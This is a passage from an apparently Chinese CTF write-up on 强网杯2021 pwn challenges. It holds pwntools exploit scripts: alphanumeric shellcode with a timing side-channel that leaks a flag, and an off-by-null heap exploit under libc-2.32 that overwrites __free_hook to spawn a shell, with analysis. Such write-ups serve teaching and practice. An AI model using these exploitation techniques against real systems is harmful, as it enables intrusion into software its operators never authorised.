class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./shellcode&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def exp(index,ch):</span><br><span class="line">    shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">    /*mmap(0x40404040,0x7e,0x7,0x22,0,0)*/</span><br><span class="line">    push 0x40404040</span><br><span class="line">    pop rdi</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rsi,0x7e</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    xor rdx,0x7</span><br><span class="line">    xor rcx,rcx</span><br><span class="line">    xor rcx,0x22</span><br><span class="line">    xor r8,r8</span><br><span class="line">    xor r9,r9</span><br><span class="line">    xor rax,rax</span><br><span class="line">    xor rax,0x9</span><br><span class="line">    syscall</span><br><span class="line">    /*read(0,0x40404040,0x40404040)*/</span><br><span class="line">    push 0x40404040</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x40404040</span><br><span class="line">    pop rdx</span><br><span class="line">    xor rdi,rdi</span><br><span class="line">    xor rax,rax</span><br><span class="line">    syscall</span><br><span class="line">    /*change into x86*/</span><br><span class="line">    push 0x23</span><br><span class="line">    push rsi</span><br><span class="line">    retfq</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = &#x27;&#x27;&#x27;</span><br><span class="line">    /*fstat(open32)(&#x27;flag&#x27;,0)*/</span><br><span class="line">    mov esp,0x40404140</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    push esp</span><br><span class="line">    pop ebx</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor eax,eax</span><br><span class="line">    xor eax,5</span><br><span class="line">    int 0x80</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload_x64 = &#x27;&#x27;&#x27;</span><br><span class="line">    /*change into x86-64*/</span><br><span class="line">    push 0x33</span><br><span class="line">    push 0x4040405e</span><br><span class="line">    retfq</span><br><span class="line">    /*read(fd,0x40404240,0x20)*/</span><br><span class="line">    mov rdi,3</span><br><span class="line">    push 0x40404240</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx,0x20</span><br><span class="line">    xor rax,rax</span><br><span class="line">    syscall </span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    shellcode = &#x27;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2E0r150p020n1M114F0x4q3V2p0y1L3s0y4w4t0700154x1K3E3S0R1M0H3a11124z0x0H3d7o4w4D0908050X0q0u0t080o2C0s150s2s0j2z104r0x0y3c0n041k2r0d1L4q00&#x27;</span><br><span class="line"></span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendline(shellcode)</span><br><span class="line">    payload = asm(payload)</span><br><span class="line">    payload += asm(payload_x64,arch = &#x27;amd64&#x27;)</span><br><span class="line">    if index == 0:</span><br><span class="line">        compare = &#x27;cmp byte ptr [rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret&#x27;.format(index,ch)</span><br><span class="line">    else:</span><br><span class="line">        compare = &#x27;cmp byte ptr [rsi+&#123;0&#125;],&#123;1&#125;;jz $-4;ret&#x27;.format(index,ch)</span><br><span class="line">    payload += asm(compare,arch = &#x27;amd64&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">index = 0</span><br><span class="line">flag = []</span><br><span class="line">while 1:</span><br><span class="line">    for ch in range(32,128):</span><br><span class="line">        io = process(&#x27;./shellcode&#x27;)</span><br><span class="line">        exp(index,ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        try:</span><br><span class="line">            io.recv(timeout=2)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        io.close()</span><br><span class="line">        end = time.time()</span><br><span class="line">        if end - start &gt; 1.5:</span><br><span class="line">            flag.append(chr(ch))</span><br><span class="line">            print(&#x27;&#x27;.join(flag))</span><br><span class="line">            break</span><br><span class="line">    index += 1</span><br></pre></td></tr></table></figure><p>exp2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">#p = process(&#x27;./shellcode&#x27;)</span><br><span class="line">p = remote(&#x27;39.105.137.118&#x27;,50050)</span><br><span class="line">#p.recvuntil(&quot;shellcode: &quot;)</span><br><span class="line">def exp(index,ch):</span><br><span class="line">    append_x86 = &#x27;&#x27;&#x27;</span><br><span class="line">    push ebx</span><br><span class="line">    pop ebx</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode_x86 = &#x27;&#x27;&#x27;</span><br><span class="line">    /*fp = open(&quot;flag&quot;)*/</span><br><span class="line">    mov esp,0x40404140</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    push esp</span><br><span class="line">    pop ebx</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    mov eax,5</span><br><span class="line">    int 0x80</span><br><span class="line">    mov ecx,eax</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode_flag = &#x27;&#x27;&#x27;</span><br><span class="line">    push 0x33</span><br><span class="line">    push 0x40404089</span><br><span class="line">    retfq</span><br><span class="line">    /*read(fp,buf,0x70)*/</span><br><span class="line">    mov rdi,rcx</span><br><span class="line">    push 0x40404530</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx,0x70</span><br><span class="line">    xor rax,rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode_x86 = asm(shellcode_x86)</span><br><span class="line">    shellcode_flag = asm(shellcode_flag,arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;)</span><br><span class="line">    shellcode = &#x27;&#x27;</span><br><span class="line">    append = &#x27;&#x27;&#x27;</span><br><span class="line">    push rdx</span><br><span class="line">    pop rdx</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    # </span><br><span class="line">    shellcode_mmap = &#x27;&#x27;&#x27;</span><br><span class="line">    /*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="line">    push 0x40404040 /*set rdi*/</span><br><span class="line">    pop rdi</span><br><span class="line">    </span><br><span class="line">    push 0x7e /*set rsi*/</span><br><span class="line">    pop rsi</span><br><span class="line">    </span><br><span class="line">    push 0x40 /*set rdx*/</span><br><span class="line">    pop rax</span><br><span class="line">    xor al,0x47</span><br><span class="line">       push rax</span><br><span class="line">    pop rdx</span><br><span class="line">    </span><br><span class="line">    push 0x40 /*set r8*/</span><br><span class="line">    pop rax</span><br><span class="line">    xor al,0x40</span><br><span class="line">    push rax</span><br><span class="line">    pop r8</span><br><span class="line">    </span><br><span class="line">    push rax /*set r9*/</span><br><span class="line">    pop r9</span><br><span class="line">    </span><br><span class="line">    /*syscall*/</span><br><span class="line">    push rbx</span><br><span class="line">    pop rax</span><br><span class="line">    push 0x5d</span><br><span class="line">    pop rcx</span><br><span class="line">    xor byte ptr[rax+0x31],cl</span><br><span class="line">    push 0x5f</span><br><span class="line">    pop rcx</span><br><span class="line">    xor byte ptr[rax+0x32],cl</span><br><span class="line">    </span><br><span class="line">    push 0x22 /*set rcx*/</span><br><span class="line">    pop rcx</span><br><span class="line">    </span><br><span class="line">    push 0x40/*set rax*/</span><br><span class="line">    pop rax</span><br><span class="line">    xor al,0x49</span><br><span class="line">    </span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    shellcode_read = &#x27;&#x27;&#x27;</span><br><span class="line">    /*read(0,0x40404040,0x70)*/</span><br><span class="line">    push 0x40404040</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x40</span><br><span class="line">    pop rax</span><br><span class="line">    xor al,0x40</span><br><span class="line">    push rax</span><br><span class="line">    pop rdi</span><br><span class="line">    xor al,0x40</span><br><span class="line">    push 0x70</span><br><span class="line">    pop rdx</span><br><span class="line">    push rbx</span><br><span class="line">    pop rax</span><br><span class="line">    push 0x5d</span><br><span class="line">    pop rcx</span><br><span class="line">    xor byte ptr[rax+0x57],cl</span><br><span class="line">    push 0x5f</span><br><span class="line">    pop rcx</span><br><span class="line">    xor byte ptr[rax+0x58],cl</span><br><span class="line">    push rdx</span><br><span class="line">    pop rax</span><br><span class="line">    xor al,0x70</span><br><span class="line">    </span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    shellcode_retfq = &#x27;&#x27;&#x27;</span><br><span class="line">    push rbx</span><br><span class="line">    pop rax</span><br><span class="line">    </span><br><span class="line">    xor al,0x40</span><br><span class="line">    </span><br><span class="line">    push 0x72</span><br><span class="line">    pop rcx</span><br><span class="line">    xor byte ptr[rax+0x40],cl</span><br><span class="line">    push 0x68</span><br><span class="line">    pop rcx</span><br><span class="line">    xor byte ptr[rax+0x40],cl</span><br><span class="line">    push 0x47</span><br><span class="line">    pop rcx</span><br><span class="line">    sub byte ptr[rax+0x41],cl</span><br><span class="line">    push 0x48</span><br><span class="line">    pop rcx</span><br><span class="line">    sub byte ptr[rax+0x41],cl</span><br><span class="line">    push rdi</span><br><span class="line">    push rdi</span><br><span class="line">    push 0x23</span><br><span class="line">    push 0x40404040</span><br><span class="line">        pop rax</span><br><span class="line">    push rax</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    shellcode += shellcode_mmap</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode += shellcode_read</span><br><span class="line">    shellcode += append</span><br><span class="line"></span><br><span class="line">    shellcode += shellcode_retfq</span><br><span class="line">    shellcode += append</span><br><span class="line">    shellcode = asm(shellcode,arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;)</span><br><span class="line">    #print hex(len(shellcode))</span><br><span class="line"></span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line">    #raw_input()</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    shellcode = shellcode_x86 + 0x29*&#x27;\x90&#x27; + shellcode_flag</span><br><span class="line">    if index ==0:</span><br><span class="line">    shellcode += asm(&quot;cmp byte ptr [rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret&quot;.format(index,ch),arch = &#x27;amd64&#x27;)</span><br><span class="line">    else:</span><br><span class="line">    shellcode += asm(&quot;cmp byte ptr [rsi+&#123;0&#125;],&#123;1&#125;;jz $-4;ret&quot;.format(index,ch),arch = &#x27;amd64&#x27;)</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line">    #p.recv(timeout=10)</span><br><span class="line">    #p.interactive() </span><br><span class="line"></span><br><span class="line">#exp(0,110)</span><br><span class="line">index = 6</span><br><span class="line">ans = []</span><br><span class="line">while 1:</span><br><span class="line">    for ch in range(32,128):</span><br><span class="line">        p = remote(&#x27;39.105.137.118&#x27;,50050)</span><br><span class="line">        exp(index,ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        try:</span><br><span class="line">            p.recv(timeout=2)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        end = time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        print(ans)</span><br><span class="line">        if end-start &gt;1.5:</span><br><span class="line">            ans.append(ch)</span><br><span class="line">            print(&quot;&quot;.join([chr(i) for i in ans]))</span><br><span class="line">            break</span><br><span class="line">    index = index + 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="baby-biary-libc-2-32下的off-by-null"><a href="#baby-biary-libc-2-32下的off-by-null" class="headerlink" title="baby_biary(libc-2.32下的off-by-null)"></a>baby_biary(libc-2.32下的off-by-null)</h3><p>保护全开，发现有未解析的函数<code>&amp;sub_1268+1</code>，进入函数中发现ida并没有将其转化为伪代码，我们只需要在偏移为0x126a的地方按P，就能创建函数，将其转化为伪代码，发下是初始化部分，如下图：</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624212304520.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624212304520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624212304520"></p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624212459333.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624212459333.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624212459333"></p><p><em>调试过程中可以将alarm函数patch掉，方便调试。</em></p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624214613103.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624214613103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624214613103"></p><p>此程序有add、show、dele功能，漏洞代码在下图处，<code>v2+1+a2</code>超出了一个字节，但只能修改半个字节，因此我们可以将半个字节改为0，造成off-by-null。</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624214952498.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624214952498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624214952498"></p><p>由于是libc-2.32的程序，在libc-2.29中就对合并堆块这一过程增加的保护，如下：</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624215632483.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624215632483.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624215632483"></p><p><del>libc-2.32暂时还不清楚对堆块合并加了什么保护，后续看看源码时再写。</del></p><p>因此我们可以利用fd_nextsize、bk_nextsize来构造fakechunk，最后合并fakechunk造成堆块重叠。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">pc=&quot;./baby_diary&quot;</span><br><span class="line">reomote_addr=[&quot;8.140.114.72&quot;,1399]</span><br><span class="line"></span><br><span class="line">elf = ELF(pc)</span><br><span class="line"></span><br><span class="line">context.binary=pc</span><br><span class="line">p=process(pc)</span><br><span class="line"></span><br><span class="line">ru = lambda x : p.recvuntil(x,timeout=0.2)</span><br><span class="line">sn = lambda x : p.send(x)</span><br><span class="line">rl = lambda   : p.recvline() </span><br><span class="line">sl = lambda x : p.sendline(x)</span><br><span class="line">rv = lambda x : p.recv(x)</span><br><span class="line">sa = lambda a,b : p.sendafter(a,b)</span><br><span class="line">sla = lambda a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">def lg(s,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(s,addr))</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    ru(&quot;&gt;&gt; &quot;)</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,c=&#x27;a&#x27;):</span><br><span class="line">    menu(1)</span><br><span class="line">    ru(&quot;size: &quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(&quot;content: &quot;)</span><br><span class="line">    sl(c)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    ru(&quot;index: &quot;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    ru(&quot;index: &quot;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(&quot;content; &quot;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x38-1,&#x27;padding&#x27;)#0-6</span><br><span class="line"></span><br><span class="line">add(0x98-1,&quot;padding&quot;)#7</span><br><span class="line">add(0xb40,&quot;padding&quot;)#8</span><br><span class="line">add(0x10,&quot;padding&quot;)#9</span><br><span class="line">dele(8)</span><br><span class="line">add(0x1000,&#x27;&#x27;)#8</span><br><span class="line">add(0x38-1,&#x27;&#x27;)#10</span><br><span class="line"></span><br><span class="line">add(0x38-1,&#x27;padding&#x27;)#11</span><br><span class="line">add(0x80,&#x27;padding&#x27;)#12</span><br><span class="line">add(0x38-1,&#x27;a&#x27;)#13</span><br><span class="line">add(0x38-1,&#x27;b&#x27;)#14</span><br><span class="line">add(0x38-1,&#x27;c&#x27;)#15</span><br><span class="line">add(0x38-1,&#x27;d&#x27;)#16</span><br><span class="line">for i in range(7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(15)</span><br><span class="line">dele(13)#0x600</span><br><span class="line"># clear tcache</span><br><span class="line">for i in range(7): #0-6</span><br><span class="line">    add(0x38-1,&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x420,&#x27;padding&#x27;)#13</span><br><span class="line">add(0x38-1,p64(0x50))#15 0x600</span><br><span class="line"></span><br><span class="line">dele(10)</span><br><span class="line">add(0x38-1,&#x27;\x00&#x27;*7+&#x27;\x03&#x27;+p64(0x201))</span><br><span class="line"></span><br><span class="line">add(0x38-1,&#x27;clear&#x27;)</span><br><span class="line">for i in range(7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(11)</span><br><span class="line">dele(10)</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x38-1,&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x38-1,&#x27;&#x27;)</span><br><span class="line">dele(16)</span><br><span class="line">add(0x38-1,&#x27;\x00&#x27;*0x37)#11</span><br><span class="line">dele(11)</span><br><span class="line">add(0x38-1,&#x27;\x00&#x27;*0x2f+&#x27;\x20&#x27;)</span><br><span class="line">dele(13)</span><br><span class="line">pause()</span><br><span class="line">add(0x30)</span><br><span class="line">add(0x20)</span><br><span class="line">add(0x30)</span><br><span class="line"></span><br><span class="line">show(12)</span><br><span class="line">libc_base = u64(ru(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))- 0x1ebbe0</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">dele(17)</span><br><span class="line">dele(15)</span><br><span class="line"></span><br><span class="line">sys_addr = 0x55410 + libc_base</span><br><span class="line">print(sys_addr)</span><br><span class="line">free_hook = 0x1eeb28 +libc_base</span><br><span class="line"></span><br><span class="line">add(0xa0,&#x27;\x00&#x27;*0x88+p64(0x41)+p64(free_hook))</span><br><span class="line">add(0x30,&#x27;/bin/sh\x00&#x27;) #17</span><br><span class="line">add(0x30,p64(sys_addr)) #19</span><br><span class="line">dele(17)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><em>因为准备出off-by-null在libc-2.31.so下的利用，所以又把这个题重新复现了一遍，有了新的认识</em></p><p>因为libc-2.29对于堆块合并时增加了新的保护（保护见上），即要dele的chunk的prevsize要和即将要合并的低地址的chunk的size要相同，这就防止了在中间插入一些没有dele的chunk这一种方法。第二个防护就是将要合并的chunk（p）的fd-&gt;bk=p；bk-&gt;fd=p;因此我没可以利用largebin中的fd_nextsize和bk_nextsize来代替fd、bk。</p><p>我们先构造fd-&gt;bk=p,先申请一个0x1000的chunk，在将他放入unsortbin中，通过申请一个更大的chunk使其放入largebin中，这时就有了fd_nextsize，bk_nextsize，为构造fake_chunk做准备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(0x57,&#x27;0&#x27;)#0</span><br><span class="line">add(0x1007,&#x27;1&#x27;)#1</span><br><span class="line">add(0x77,&#x27;2&#x27;)#2</span><br><span class="line">add(0xf7,&#x27;3&#x27;)#3</span><br><span class="line">add(0xf7,&#x27;4&#x27;)#4</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x37,&#x27;5&#x27;)#5~11</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">add(0x1017,&#x27;1&#x27;)#1</span><br></pre></td></tr></table></figure><p>接着利用在largebin中的freechunk，申请一连串的chunk，充当合并后可以使用的chunk，以及保证地址后三位是我们需要的地址（这需要调试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(0x37,&#x27;12&#x27;)#12</span><br><span class="line">add(0x37,&#x27;13&#x27;)#13</span><br><span class="line">add(0x37,&#x27;14&#x27;)#14</span><br><span class="line">add(0x47,&#x27;15&#x27;)#15</span><br><span class="line">add(0x37,&#x27;16&#x27;)#16</span><br><span class="line">add(0x170,&#x27;17&#x27;)#17</span><br><span class="line">add(0x37,&#x27;18&#x27;)#18</span><br></pre></td></tr></table></figure><p>接着利用malloc_consolidate将fastbin中的chunk放入smallbin（注意顺序要变）中，利用smallbin中可以改变bk进而使fd-&gt;bk = p</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">翻阅了一下 这个还必须是largebin的大小(最小为0x400) 小了还不行 不然fastbin进不了smallbin (如果fastbin进不了smallbin不会造成利用失败当我没说)</span><br><span class="line">原因：这里的fastbin chunk 进 smallbin chunk的时候是</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line">这里的malloc_consolidate做的 如果nb(实际chunk大小)不是largebin 